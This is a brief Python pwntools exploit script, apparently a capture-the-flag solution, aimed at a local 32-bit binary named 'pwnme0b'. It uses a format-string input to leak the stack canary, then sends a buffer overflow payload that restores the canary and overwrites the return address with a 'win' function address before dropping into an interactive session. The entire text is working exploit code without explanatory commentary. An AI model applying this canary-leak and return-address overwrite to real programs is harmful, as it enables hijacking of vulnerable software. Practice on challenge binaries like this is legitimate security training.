from pwn import *

context.arch = 'i386'
p = process('./pwnme0b')

win = 0x080491b6

p.recvline()

p.sendline(b'%11$p')


p.recvuntil(b'0x')
canary = int(p.recvline().strip(), 16)
log.info(f"Canary: {hex(canary)}")

payload  = b'A' * 0x6c
payload += p32(canary)
payload += b'B' * 12
payload += p32(win)

p.sendline(payload)
p.interactive()
